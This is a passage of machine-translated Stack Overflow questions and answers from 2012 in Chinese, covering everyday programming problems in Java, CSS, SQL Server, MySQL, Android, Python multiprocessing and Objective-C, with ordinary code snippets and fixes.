if (s.charAt(0) == '+') s = s.substring(1);
int val= Integer.parseInt(s); 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-05-21T13:15:35.057

我正在使用 Java 7，并且`Integer.parseInt("+500");`没有抛出任何异常。

> 字符串中的字符必须都是十进制数字，除了第一个字符可以是 ASCII 减号`'-'`( `'\u002D'`) 表示负值或 ASCII 加号`'+'`( `'\u002B'`) 表示正值。

[Integer.parseInt(String) 的 Java 7 文档](http://docs.oracle.com/javase/7/docs/api/java/lang/Integer.html#parseInt%28java.lang.String%29)

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-05-21T13:14:57.790

> 公共静态 int parseInt(String s) 抛出 NumberFormatException
> 
> 将字符串参数解析为有符号十进制整数。字符串中的字符必须都是十进制数字，除了第一个字符可以是 ASCII 减号“-”（“\u002D”）表示负值。返回结果整数值，就像参数和基数 10 作为参数提供给 parseInt(java.lang.String, int) 方法一样。

[Javadoc](http://docs.oracle.com/javase/1.4.2/docs/api/java/lang/Integer.html#parseInt%28java.lang.String%29)

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2016-02-19T16:07:39.617

实现从 java 6 到 7

# html - 从图例元素中删除左填充

> ID：10685909
> 
> 赞同：3
> 
> 时间：2012-05-21T13:11:04.547
> 
> 标签：html, css

我希望包含内容的字段集和 div 在视觉上是相等的。我使用 YUI 3.4.1 重置 CSS 并且我有以下标记：

```
<fieldset>
    <legend>Hello world!</legend>
    <div>Lorem ipsum</div>                
</fieldset>
<div>
    <h3>Hello world!</h3>
    <div>Lorem ipsum</div>                
</div> 
```

在 IE7 中，图例元素略微缩进。我试图删除填充、边距和文本缩进。

```
fieldset,div{ 
    background-color: red;
    width: 200px;
    padding: 0;
    text-indent: 0;
    margin: 0;
}
legend,h3{ 
    background-color: yellow; 
    width: 200px; 
    display: block;
    padding: 0;
    text-indent: 0;
    margin: 0;
} 
```

我在这里还缺少其他可以帮助解决问题的属性吗？

[http://jsfiddle.net/DBhQb/](http://jsfiddle.net/DBhQb/)

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-05-21T13:16:33.100

在[HTML5 样板](http://html5boilerplate.com/) `legend`的 CSS 文件上以这种方式设置样式

```
legend { border: 0; *margin-left: -7px; padding: 0; white-space: normal; } 
```

`*margin-left: -7px;`应该成功，因为它是 IE<8 的 css hack

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-21T13:16:56.347

尝试这个

```
fieldset , legend{ padding:0px; margin:0px;} 
```

# sql-server - SQL Server 将多行合并为一列

> ID：10685914
> 
> 赞同：3
> 
> 时间：2012-05-21T13:11:19.327
> 
> 标签：sql-server, merge, pivot

我正在尝试将多行合并为一列。我有一张桌子：

```
COST_ID PRICE_ID PRICE_TIER   COST
1        4         1        850.00
2        4         2        950.00 
3        4         3        1000.00
4        7         1        250.00
5        7         2        275.00
6        7         3        300.00 
```

我想为每个 price_id 输出一行，它应该看起来像这样：

```
ID PriceID C1ID C1Cost   C2ID  C2Cost C3ID  C3Cost
1    4      1    850.00    2   950.00   3    1000.00
2    7      4    250.00    5   275.00   6    300.00 
```

谢谢您的帮助。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-21T13:43:29.820

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-21T13:37:13.653

如果 PRICE_ID 和 PRICE_TIER 形成一个唯一键，你可以这样做：

```
select
      row_number() over (order by PRICE_ID) as ID
    , PRICE_ID as PriceID
    , (select COST_ID from cte where PRICE_ID = t.PRICE_ID and PRICE_TIER = 1) as C1ID
    , (select COST from cte where PRICE_ID = t.PRICE_ID and PRICE_TIER = 1) as C1Cost
    , (select COST_ID from cte where PRICE_ID = t.PRICE_ID and PRICE_TIER = 2) as C2ID
    , (select COST from cte where PRICE_ID = t.PRICE_ID and PRICE_TIER = 2) as C2Cost
    , (select COST_ID from cte where PRICE_ID = t.PRICE_ID and PRICE_TIER = 3) as C3ID
    , (select COST from cte where PRICE_ID = t.PRICE_ID and PRICE_TIER = 3) as C3Cost
from MY_TABLE t
group by PRICE_ID
order by PRICE_ID 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-21T13:25:30.507

SQL Server 有数据透视表，[Pinal Dave](http://blog.sqlauthority.com/2008/06/07/sql-server-pivot-and-unpivot-table-examples/)通常会很好地介绍 SQL Server 的东西——至少它是一个开始的地方。

# android - 启动器中的主页按钮不起作用

> ID：10685918
> 
> 赞同：2
> 
> 时间：2012-05-21T13:11:34.767
> 
> 标签：android, launcher

我已经开发了自己的 Android 启动器，它运行良好，问题是当我单击 HOME 按钮时它不会将我重定向到 HOME 页面，我该如何解决这个问题，谢谢！

这是我的清单文件：

```
<?xml version="1.0" encoding="UTF-8"?> 
```

```
<uses-sdk android:minSdkVersion="8" />

<uses-permission android:name="android.permission.INTERNET" />

<permission
    android:name="com.android.launcher.permission.INSTALL_SHORTCUT"
    android:permissionGroup="android.permission-group.SYSTEM_TOOLS"
    android:protectionLevel="normal" />
<permission
    android:name="com.android.launcher.permission.UNINSTALL_SHORTCUT"
    android:permissionGroup="android.permission-group.SYSTEM_TOOLS"
    android:protectionLevel="normal" />
<permission
    android:name="com.android.launcher.permission.READ_SETTINGS"
    android:permissionGroup="android.permission-group.SYSTEM_TOOLS"
    android:protectionLevel="normal" />
<permission
    android:name="com.android.launcher.permission.WRITE_SETTINGS"
    android:permissionGroup="android.permission-group.SYSTEM_TOOLS"
    android:protectionLevel="normal" />

<uses-permission android:name="android.permission.CALL_PHONE" />
<uses-permission android:name="android.permission.EXPAND_STATUS_BAR" />
<uses-permission android:name="android.permission.GET_TASKS" />
<uses-permission android:name="android.permission.READ_CONTACTS" />
<uses-permission android:name="android.permission.SET_WALLPAPER" />
<uses-permission android:name="android.permission.SET_WALLPAPER_HINTS" />
<uses-permission android:name="android.permission.VIBRATE" />
<uses-permission android:name="android.permission.WRITE_SETTINGS" />
<uses-permission android:name="android.permission.BIND_APPWIDGET" />
<uses-permission android:name="com.android.launcher.permission.READ_SETTINGS" />
<uses-permission android:name="com.android.launcher.permission.WRITE_SETTINGS" />

<application
    android:name="STB"
    android:icon="@drawable/icon"
    android:label="@string/app_name"
    android:theme="@android:style/Theme.Black.NoTitleBar.Fullscreen" >
    <activity
        android:name=".testingactivity.CoverFlowTestingActivity"
        android:label="@string/app_name" >
        <intent-filter>
            <action android:name="android.intent.action.MAIN" />

            <category android:name="android.intent.category.HOME" />
            <category android:name="android.intent.category.DEFAULT" />
            <category android:name="android.intent.category.LAUNCHER" />
            <category android:name="android.intent.category.MONKEY" />
        </intent-filter>
    </activity>
    <activity
        android:name="pl.polidea.coverflow.testingactivity.PagerLauncherActivity"
        android:label="@string/app_name" >
    </activity>
    <activity
        android:name="pl.polidea.coverflow.testingactivity.GameActivity"
        android:label="@string/app_name" >
    </activity>
    <activity
        android:name="pl.polidea.coverflow.testingactivity.CinemaActivity"
        android:label="@string/app_name" >
    </activity>
    <activity
        android:name="pl.polidea.coverflow.testingactivity.Black"
        android:label="@string/app_name" >
    </activity>
    <activity
        android:name="pl.polidea.coverflow.testingactivity.CommunicationActivity"
        android:label="@string/app_name" >
    </activity>
    <activity
        android:name="pl.polidea.coverflow.testingactivity.InternetActivity"
        android:label="@string/app_name" >
    </activity>
    <activity
        android:name="pl.polidea.coverflow.testingactivity.LiveActivity"
        android:label="@string/app_name" >
    </activity>
    <activity
        android:name="pl.polidea.coverflow.testingactivity.MusicActivity"
        android:label="@string/app_name" >
    </activity>
    <activity
        android:name="pl.polidea.coverflow.testingactivity.SettingsActivity"
        android:label="@string/app_name" >
    </activity>
    <activity
        android:name="pl.polidea.coverflow.testingactivity.SocialActivity"
        android:label="@string/app_name" >
    </activity>
    <activity
        android:name="pl.polidea.coverflow.testingactivity.TvShowActivity"
        android:label="@string/app_name" >
    </activity>
    <activity
        android:name="pl.polidea.coverflow.testingactivity.ApplicationActivity"
        android:label="@string/app_name" >
    </activity>

    <receiver android:name="pl.polidea.coverflow.testingactivity.ApplicationBroadcastService" >
        <intent-filter>
            <action android:name="android.intent.action.PACKAGE_INSTALL" />
            <action android:name="android.intent.action.PACKAGE_ADDED" />

            <data android:scheme="package" />
        </intent-filter>
    </receiver>
</application> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-21T14:57:28.607

查看[主页](http://developer.android.com/resources/samples/Home/src/com/example/android/home/Home.html)- 自定义启动器示例。这是其中的关键事件调度程序：

```
@Override
public boolean dispatchKeyEvent(KeyEvent event) {
    if (event.getAction() == KeyEvent.ACTION_DOWN) {
            ...
            case KeyEvent.KEYCODE_HOME:
                mHomeDown = true;
                return true;
        }
    } else if (event.getAction() == KeyEvent.ACTION_UP) {
        switch (event.getKeyCode()) {
            ...
            case KeyEvent.KEYCODE_HOME:
                if (!event.isCanceled()) {
                    // Do HOME behavior.
                }
                mHomeDown = true;
                return true;
        }
    }

    return super.dispatchKeyEvent(event);
} 
```

您可以在评论中执行您自己的行为。在此示例的情况下，将`hideApplications()`调用隐藏应用程序网格。

# python - 防止 __del__ 在多处理中被调用

> ID：10685921
> 
> 赞同：3
> 
> 时间：2012-05-21T13:11:40.780
> 
> 标签：python, multiprocessing

在玩弄时，`multiprocessing`我注意到在下面的脚本中，`__del__`它被调用了两次（一次在子进程中，一次在父进程中）。

```
class myclass(object):

    def __init__(self,val):
        self.val=val
        print ("Initializing %s"%str(self.val))

    def __del__(self):
        print ("deleting %s"%str(self.val))

if __name__ == "__main__":
    import multiprocessing
    p=multiprocessing.Pool(4)
    obj_list=p.map(myclass,range(30))
    raw_input() 
```

对于这个脚本，没关系......但是如果`__del__`有副作用怎么办？（我能想到的一个可能的例子是释放某种锁定文件）。有没有办法防止`__del__`被调用两次？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-21T14:08:31.467

释放锁之类的事情不应该是在`__del__`方法中做的事情，最好在语句中使用锁作为上下文管理器`with`来确保锁的释放。

除此之外，生成的类实例存在于不同的进程中，更改子进程中的任何内容都不会影响其他子进程，当然用于 IPC 的对象除外（如队列、管道、锁等）多处理模块）。

另一件事是：返回给主流程的实例与子流程中创建的实例不同。多处理中的返回值在子进程中被腌制，发送到父进程并在那里取消腌制。此过程[涉及](http://hg.python.org/cpython/file/02f13577b6fe/Lib/multiprocessing/connection.py#l201)[`ForkingPickler`](http://hg.python.org/cpython/file/02f13577b6fe/Lib/multiprocessing/forking.py#l36)*. 因此`__del__`不会在同一实例上多次调用，而是在不同子流程中的不同实例上调用。

*：不完全确定这里到底发生了什么，也许其他人知道更多......但也许该示例的不同版本会有所帮助：

```
import multiprocessing
import time
import os

class myclass(object):

    def __init__(self,val):
        self.val=val
        print ("Initializing %s - %s - %s" % (str(self.val), self, os.getpid()))

    def __del__(self):
        print ("Deleting     %s - %s - %s" % (str(self.val), self, os.getpid()))

if __name__ == "__main__":
    p = multiprocessing.Pool(3)
    obj_list=p.map(myclass,range(5))
    del p
    for o in obj_list:
        print ("Returned     %s - %s - %s" % (str(o.val), o, os.getpid())) 
```

输出：

```
Initializing 0 - <__main__.myclass object at 0x7f2497fdc0d0> - 7574
Initializing 2 - <__main__.myclass object at 0x7f2497fdc110> - 7574
Deleting     0 - <__main__.myclass object at 0x7f2497fdc0d0> - 7574
Initializing 1 - <__main__.myclass object at 0x7f2497fdc150> - 7575
Initializing 3 - <__main__.myclass object at 0x7f2497fdc1d0> - 7575
Deleting     1 - <__main__.myclass object at 0x7f2497fdc150> - 7575
Initializing 4 - <__main__.myclass object at 0x7f2497fdc0d0> - 7574
Deleting     2 - <__main__.myclass object at 0x7f2497fdc110> - 7574
Returned     0 - <__main__.myclass object at 0x7f2497fdc650> - 7573
Returned     1 - <__main__.myclass object at 0x7f2497fdc7d0> - 7573
Returned     2 - <__main__.myclass object at 0x7f2497fdc810> - 7573
Returned     3 - <__main__.myclass object at 0x7f2497fdc850> - 7573
Returned     4 - <__main__.myclass object at 0x7f2497fdc890> - 7573
Deleting     3 - <__main__.myclass object at 0x7f2497fdc1d0> - 7575
Deleting     4 - <__main__.myclass object at 0x7f2497fdc890> - 7573
Deleting     3 - <__main__.myclass object at 0x7f2497fdc850> - 7573
Deleting     2 - <__main__.myclass object at 0x7f2497fdc810> - 7573
Deleting     1 - <__main__.myclass object at 0x7f2497fdc7d0> - 7573
Deleting     0 - <__main__.myclass object at 0x7f2497fdc650> - 7573 
```

注意不同的进程和对象 ID

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-05-21T13:54:05.143

`__del__`通常用于最终确定一个对象，而不是外部资源，因此在两个进程中调用它是有意义的（因为当然，在 fork 之后都有自己的对象副本）。尝试阻止`__del__`在给定进程中的任何使用不是一个好主意，但是在您*真正*需要它来关闭外部资源（例如文件系统上的文件）不会被分叉复制的地方，你的析构函数应该在这样做之前检查预期的资源是否真的需要清理。“释放某种锁定文件”可能会也可能不会，这取决于您如何实现它。

如果它是一个选项，您可能希望考虑使用“ `with`”上下文管理器而不是依赖于垃圾收集的变幻莫测来进行资源获取和释放。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-05-21T15:54:26.573

绝对不能保证 __del__ 被称为零次、一次或多次，尤其是在涉及多处理时。你不应该依赖它来释放锁。__del__ 可能会在很久以后或根本不调用，并且您的发布不会发生。您应该按照建议使用上下文管理器。

还要记住，虽然 CPython 只会在引用循环中推迟使用 __del__ 方法的对象集合（使用循环而不是 refcount gc），但不能保证其他 Python 实现的行为方式相同。

# android - 无法滚动所有 ListView 项目

> ID：10685926
> 
> 赞同：0
> 
> 时间：2012-05-21T13:11:53.003
> 
> 标签：android, view, scroll

我无法滚动所有列表项。我可以在模拟器上用鼠标滚动条滚动它，但如果想在触摸时滚动它，它就不会滚动。

有人可以帮帮我吗？

```
 <?xml version="1.0" encoding="utf-8"?>
        <ScrollView xmlns:android="http://schemas.android.com/apk/res/android"
            android:id="@+id/scrollView1"
            android:layout_width="fill_parent"
            android:layout_height="fill_parent"
            android:orientation="vertical" >

            <RelativeLayout
                android:layout_width="fill_parent"
                android:layout_height="768dp" >

                <TextView
                    android:id="@+id/textView1"
                    android:layout_width="wrap_content"
                    android:layout_height="wrap_content"
                    android:layout_alignParentLeft="true"
                    android:layout_alignParentTop="true"
                    android:text="Take Photo"
                    android:textAppearance="?android:attr/textAppearanceMedium" />

                <EditText
                    android:id="@+id/editText1"
                    android:layout_width="wrap_content"
                    android:layout_height="wrap_content"
                    android:layout_alignParentLeft="true"
                    android:layout_below="@+id/textView1"
                    android:layout_toLeftOf="@+id/button1"
                    android:ems="10"
                    android:inputType="textPersonName" >

                    <requestFocus />
                </EditText>

                <Button
                    android:id="@+id/button1"
                    style="?android:attr/buttonStyleSmall"
                    android:layout_width="wrap_content"
                    android:layout_height="wrap_content"
                    android:layout_alignBaseline="@+id/editText1"
                    android:layout_alignBottom="@+id/editText1"
                    android:layout_alignParentRight="true"
                    android:text="Camera" />

                <TextView
                    android:id="@+id/textView2"
                    android:layout_width="wrap_content"
                    android:layout_height="wrap_content"
                    android:layout_alignParentLeft="true"
                    android:layout_below="@+id/editText1"
                    android:text="Source File"
                    android:textAppearance="?android:attr/textAppearanceMedium" />

                <Spinner
                    android:id="@+id/spinner1"
                    android:layout_width="200dp"
                    android:layout_height="wrap_content"
                    android:layout_below="@+id/textView2"
                    android:entries="@array/combolist" />

                <TextView
                    android:id="@+id/textView3"
                    android:layout_width="wrap_content"
                    android:layout_height="wrap_content"
                    android:layout_alignParentLeft="true"
                    android:layout_below="@+id/spinner1"
                    android:text="What do you want to buy the Look ?" />

                <ScrollView
                    android:id="@+id/scrollView2"
                    android:layout_width="wrap_content"
                    android:layout_height="225dp"
                    android:layout_alignParentLeft="true"
                    android:layout_alignParentRight="true"
                    android:layout_below="@+id/textView3" >

                    <LinearLayout
                        android:layout_width="fill_parent"
                        android:layout_height="225dp" >

                        <ListView
                            android:id="@+id/listcheckBox"
                            android:layout_width="fill_parent"
                            android:layout_height="223dp" >

                        </ListView>

                    </LinearLayout>
                </ScrollView>

                <TextView
                    android:id="@+id/textView4"
                    android:layout_width="wrap_content"
                    android:layout_height="wrap_content"
                    android:layout_alignParentLeft="true"
                    android:layout_below="@+id/scrollView2"
                    android:text="Tag ?"
                    android:textAppearance="?android:attr/textAppearanceLarge" />

                <EditText
                    android:id="@+id/editText2"
                    android:layout_width="wrap_content"
                    android:layout_height="wrap_content"
                    android:layout_alignParentLeft="true"
                    android:layout_alignParentRight="true"
                    android:layout_below="@+id/textView4"
                    android:ems="10"
                    android:inputType="textPersonName" android:lines="1" android:maxLines="1" android:scrollHorizontally="true"/>

                <TextView
                    android:id="@+id/textView5"
                    android:layout_width="wrap_content"
                    android:layout_height="wrap_content"
                    android:layout_alignParentLeft="true"
                    android:layout_below="@+id/editText2"
                    android:text="More information about what you want"
                    android:textAppearance="?android:attr/textAppearanceMedium" />

                <EditText
                    android:id="@+id/editText3"
                    android:layout_width="wrap_content"
                    android:layout_height="150dp"
                    android:layout_alignParentLeft="true"
                    android:layout_alignRight="@+id/textView5"
                    android:layout_below="@+id/textView5"
                    android:ems="10"
                    android:inputType="textMultiLine" android:scrollbars="horizontal|vertical"/>

                <Button
                    android:id="@+id/btnsubmit"
                    android:layout_width="100dp"
                    android:layout_height="wrap_content"
                    android:layout_below="@+id/editText3"
                    android:text="Button" />

            </RelativeLayout>

        </ScrollView> 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-21T13:14:31.420

> 永远不要把你的 ListView 放在 ScrollView 里面。也不要把 MapView、ListView、WebView 放在 scrollView 里面。

因为那些已经是滚动视图本身。不需要把它放在滚动视图中。所以从滚动视图中删除它。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-21T13:15:30.240

您不能在 ScrollView 中嵌入您的 ListView。ScrollView 已经有自己的 Scroll 监听器。因此，当您尝试在具有自己的手势的视图中拥有像 listView 这样的另一个视图时，它会使您的 listview 挂断。在您的情况下，我相信仅删除 Scroll 视图就可以使其正常工作

# sql - 我想“规范化”的丑陋制表符分隔文本文件，通过 SQL 尝试

> ID：10685928
> 
> 赞同：2
> 
> 时间：2012-05-21T13:11:58.533
> 
> 标签：sql, csv

我有一个大约 1100 万行的巨大文本文件，我无法更改它，但我希望能够将其处理成可用的格式。它的基本结构如下：

```
Field1 : Type of data
Field2 : Values 
```

还有一个### 来标记文件中产品的开始和结束（不过，不确定这对我有帮助）

数据中包含大约 200,000 个独特的产品，以及与之相关的所有数据。Field1 值将重复（例如产品、价格、描述），并且值将不同以识别产品的属性。我将制表符分隔的文件导入 Access 并使用 SQL 来提取我需要的数据（所有产品的完整列表），但是能够进一步处理它并将所有部分列为一列会非常有帮助，然后通过说价格，描述等

我运行以提取产品的查询是：

```
select 
Field1, 
Field2 
from Index 
where Field1 = 'PRODUCT'; 
```

这给了我所有产品的列表

我不确定扩展上述内容是否是正确的方法，就好像我将其扩展为一样（请原谅语法，我必须在 SQL 上进行一次 bash 才能做到这一点）

```
select 
Field1, 
Field2 
from Index 
where Field1 = 'PRODUCT'
and Field1 = 'PRICE'; 
```

（如果我让它工作，我相信它不会）我将处于与我刚刚得到的大致相同的位置

```
Product
Price
Product
Price
x200000 
```

我想做的是：

```
Product   Price    Description
11111      1.11     This is part 1
11112      1.12     This is part 2 
```

我确实寻找过类似的例子，但我猜人们习惯于使用更好的输入文件......哦，从我看到的情况来看，SSIS 可能是关键？同样，从来没有玩过它，但对它来说是全新的，并且想看看这是否可以通过 SQL 实现。

非常感谢

例子 ：

```
###
PRODUCT A1000102
SHORT_DESC  SMALL COG
PRICE   1.15
RANDOM_ASSOCIATED   B
###
PRODUCT A1000103
SHORT_DESC  MEDIUM COG
PRICE   1.18
RANDOM_ASSOCIATED   B
ROTATION    YES
###
PRODUCT A1000104
SHORT_DESC  L COG
PRICE   1.15
RANDOM_ASSOCIATED   2
###
PRODUCT A1000105
SHORT_DESC  TITANIUM COG
PRICE   4.12
RANDOM_ASSOCIATED   B
###
PRODUCT A1000106
SHORT_DESC  SMALL TITANIUM COG
PRICE   1.15
RANDOM_ASSOCIATED   A
COLOUR  BLUE
###
PRODUCT A1000107
SHORT_DESC  SMALL COG
PRICE   1.15
RANDOM_ASSOCIATED   C
COUNTRY SWISS
###
PRODUCT A1000108
SHORT_DESC  SMALL COG
PRICE   1.15
RANDOM_ASSOCIATED   X
WEIGHT  9.54KG
### 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-21T13:31:54.353

这是我的建议：首先，使用批量插入将数据加载到 SQL 表中。然后使用 SQL 查询以您可能喜欢的辅助表的任何格式提取数据。

为什么我建议这个：

1.  如果加载原始数据时出现错误，出于某种原因，您可以隔离并修复它们。
2.  如果您在查看数据后改变了对数据结构的想法，只需更改查询即可。
3.  如果您需要重复该过程，您可以将所有内容保存在 t-sql 语句中以供以后运行或修改。
4.  如果你有一台多处理器机器，数据库应该最大限度地利用资源。

如果您需要在加载的表中维护行顺序，那么您可以使用视图来做到这一点。创建表如下：

```
create table DirtyData (
    DirtyData_id int identity(1,1),
    KeyNamevarchar(255),
    Value varchar(255)
);

create view v_DirtyData as
    select KeyName, Value
    from DirtyData; 
```

然后批量插入到视图中，而不是直接插入到表中。id 将被单调分配。

# objective-c - UIImageView 不缩放

> ID：10685932
> 
> 赞同：3
> 
> 时间：2012-05-21T13:12:13.883
> 
> 标签：objective-c, ios5, uiscrollview, uiimageview, zooming

我想在弹出视图上缩放图像。

我创建了 UIView 子类，基于[此](https://developer.apple.com/library/ios/#samplecode/ScrollViewSuite/Introduction/Intro.html#//apple_ref/doc/uid/DTS40008904)示例代码：

缩放视图.h：

```
@interface ZoomView : UIView <UIScrollViewDelegate> {
    UIScrollView *imageScrollView;
    UIImageView *imageView;
}
@property (strong, nonatomic) IBOutlet UIScrollView *imageScrollView;
@property (strong, nonatomic) IBOutlet UIImageView *imageView;

@end 
```

缩放视图.m：

```
#import "ZoomView.h"

#define ZOOM_VIEW_TAG 100
#define ZOOM_STEP 1.5

@interface ZoomView (UtilityMethods)
- (CGRect)zoomRectForScale:(float)scale withCenter:(CGPoint)center;
@end

@implementation ZoomView
@synthesize imageScrollView;
@synthesize imageView;

- (void)awakeFromNib{

}

#pragma mark - View lifecycle

- (void)loadView
{
    [imageView setTag:ZOOM_VIEW_TAG];

    // add gesture recognizers to the image view
    UITapGestureRecognizer *singleTap = [[UITapGestureRecognizer alloc] initWithTarget:self action:@selector(handleSingleTap:)];
    UITapGestureRecognizer *doubleTap = [[UITapGestureRecognizer alloc] initWithTarget:self action:@selector(handleDoubleTap:)];
    UITapGestureRecognizer *twoFingerTap = [[UITapGestureRecognizer alloc] initWithTarget:self action:@selector(handleTwoFingerTap:)];

    [doubleTap setNumberOfTapsRequired:2];
    [twoFingerTap setNumberOfTouchesRequired:2];

    [imageView addGestureRecognizer:singleTap];
    [imageView addGestureRecognizer:doubleTap];
    [imageView addGestureRecognizer:twoFingerTap];

    [singleTap release];
    [doubleTap release];
    [twoFingerTap release];

    // calculate minimum scale to perfectly fit image width, and begin at that scale
    float minimumScale = [imageScrollView frame].size.width  / [imageView frame].size.width;
    [imageScrollView setMinimumZoomScale:minimumScale];
    [imageScrollView setZoomScale:minimumScale];
}

- (BOOL)shouldAutorotateToInterfaceOrientation:(UIInterfaceOrientation)interfaceOrientation
{
    // Return YES for supported orientations
    return YES;
}

- (UIView *)viewForZoomingInScrollView:(UIScrollView *)scrollView {
    return [imageScrollView viewWithTag:ZOOM_VIEW_TAG];
}

- (void)scrollViewDidEndZooming:(UIScrollView *)scrollView withView:(UIView *)view atScale:(float)scale {
    [scrollView setZoomScale:scale+0.01 animated:NO];
    [scrollView setZoomScale:scale animated:NO];
}

#pragma mark TapDetectingImageViewDelegate methods

- (void)handleSingleTap:(UIGestureRecognizer *)gestureRecognizer {
    // single tap does nothing for now
}

- (void)handleDoubleTap:(UIGestureRecognizer *)gestureRecognizer {
    // double tap zooms in
    float newScale = [imageScrollView zoomScale] * ZOOM_STEP;
    CGRect zoomRect = [self zoomRectForScale:newScale withCenter:[gestureRecognizer locationInView:gestureRecognizer.view]];
    [imageScrollView zoomToRect:zoomRect animated:YES];
}

- (void)handleTwoFingerTap:(UIGestureRecognizer *)gestureRecognizer {
    // two-finger tap zooms out
    float newScale = [imageScrollView zoomScale] / ZOOM_STEP;
    CGRect zoomRect = [self zoomRectForScale:newScale withCenter:[gestureRecognizer locationInView:gestureRecognizer.view]];
    [imageScrollView zoomToRect:zoomRect animated:YES];
}

#pragma mark Utility methods

- (CGRect)zoomRectForScale:(float)scale withCenter:(CGPoint)center {
    CGRect zoomRect;

    zoomRect.size.height = [imageScrollView frame].size.height / scale;
    zoomRect.size.width  = [imageScrollView frame].size.width  / scale;

    zoomRect.origin.x    = center.x - (zoomRect.size.width  / 2.0);
    zoomRect.origin.y    = center.y - (zoomRect.size.height / 2.0);

    return zoomRect;
}

@end 
```

在我的 nib 文件中，我将视图的类设置为 ZoomView，在视图、 和 之间建立了连接`imageScrollView`，`imageView`但是`delegate`在运行代码后，图像不会缩放。我遗漏了什么？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-21T13:26:09.103

我想你拍了小照片。你必须采取更大的形象。我认为它会奏效。试试这样。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-13T15:43:00.767

尝试从 imageScrollView 委托给自己。-> imageScrollView.delegate = self;

# java - SimpleDateFormat 未按预期工作

> ID：10685934
> 
> 赞同：1
> 
> 时间：2012-05-21T13:12:23.867
> 
> 标签：java, date, time, date-format, simpledateformat

我正在使用“MM/dd/yyyy hh:mm a”来初始化 SimpleDateFormat.setLenient 选项设置为 false。以下是一些用例

1）输入字符串：-01/02/2001 3:09 AM 预期：-应该通过实际：-passes

2）输入字符串：-01/02/20016 3:09 AM 预期：-不应该通过实际：-passes 我不明白为什么 20016 被解析为有效的！！！！！！

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-05-21T13:17:32.327

我认为它在 Javadoc 中用于`SimpleDateFormat`：

**Year**：对于格式化，如果模式字母的个数为 2，则将年份截断为 2 位；否则它被解释为一个数字。

所以基本上，你可以将它限制为 2，否则，它是一个 int。所以 4-y 并不完全是 4，它只是“不是 2”。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-05-21T13:34:37.873

我同意 Peter 和 mprivat 的观点，但如果你真的需要这样做，一个解决方案可能是：

```
 DateFormat df = new SimpleDateFormat("MM/dd/yyyy hh:mm a") {
        public synchronized Date parse(String source) throws ParseException {
            Calendar cal = Calendar.getInstance();
            Date d = super.parse(source);
            cal.setTime(d);
            if (cal.get(Calendar.YEAR) > 9999 ) {
                throw new ParseException("Year too long", 11);
            }
            return d;
        };
    }; 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-05-21T13:18:05.087

它大约在未来 18000 年。通过所有科学逻辑。那么为什么 20016 年不应该延迟呢？:)

（记住 SDF 应该被标记为已弃用，因为它不是线程安全的）

# mysql - MySQL 中的 GROUP_CONCAT + SUM / COUNT 不起作用

> ID：10685935
> 
> 赞同：0
> 
> 时间：2012-05-21T13:12:24.797
> 
> 标签：mysql

我有一些桌子可以这样

```
User         : id , username
answers      : id , answers , is_correct , question_id
user_answers : user_id , question_id , answer_id , date
questions    : id , question , category
category     : id name 
```

现在我要做的是计算用户在每个类别中给出的正确答案。我的查询是这个

```
SELECT
  u.`user_name` AS `UserName`,
  u.`user_id`   AS `UserId`,
  sum(a.is_correct) AS `Score`,
  group_concat(distinct c.name) AS `Quizes`
FROM users_answers ua
  LEFT JOIN answers a
    on a.id = ua.answer_id
  LEFT JOIN users u
    ON u.user_id = ua.user_id
  left join questions q
    on q.id = a.question_id
  left join categories c
    on c.id = q.cat_id
WHERE a.is_correct = 1
GROUP BY u.user_id
ORDER BY `Score` desc, ua.date desc; 
```

它带来的结果还可以，但我需要分别获得每个类别的总分。

编辑

```
select
  s.UserName,
  s.UserId,
  GROUP_CONCAT(Score) AS CategoryScores,
  sum(s.TotalScore) as TotalScore,
  s.Quizes,
  s.LastPlayed
from (select
        u.`user_name` AS `UserName`,
        u.`user_id`   AS `UserId`,
        sum(a.is_correct) AS `Score`,
        sum(a.is_correct) AS `TotalScore`,
        group_concat(distinct c.name) AS `Quizes`,
        ua.date       as `LastPlayed`,
        c.id          as CategoryId
      FROM users_answers ua
        LEFT JOIN answers a
          on a.id = ua.answer_id
        LEFT JOIN users u
          ON u.user_id = ua.user_id
        left join questions q
          on q.id = a.question_id
        left join categories c
          on c.id = q.cat_id
      WHERE a.is_correct = 1
      GROUP BY u.user_id, CategoryId) s
GROUP BY UserId
ORDER BY `TotalScore` desc, LastPlayed desc; 
```

谢谢迈克尔，但这里的问题是现在我无法在组连接中获得类别名称。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-22T06:57:54.063

尝试这个

```
select
  UserName   as UserName,
  UserId,
  group_concat(Score) as Score,
  sum(TotalScore) as TotalScore,
  LastPlayed,
  group_concat(Quizes)    QuizNames
from (SELECT
        u.`user_name` AS `UserName`,
        u.`user_id`   AS `UserId`,
        count(ua.`id`) AS `Score`,
        count(ua.`id`) AS `TotalScore`,
        ua.date       as `LastPlayed`,
        group_concat(distinct c.name) as `Quizes`
      FROM users_answers ua
        LEFT JOIN answers a
          on a.id = ua.answer_id
        LEFT JOIN users u
          ON u.user_id = ua.user_id
        left join questions q
          on q.id = a.question_id
        left join categories c
          on c.id = q.cat_id
      WHERE a.is_correct = 1
      GROUP BY u.user_id desc,c.id
      ORDER BY `Score` desc, ua.date desc,u.user_id) sub
GROUP BY UserId desc
ORDER BY `TotalScore` desc, LastPlayed desc 
```

* * *

## 回答 #2

> 赞同：1
> 
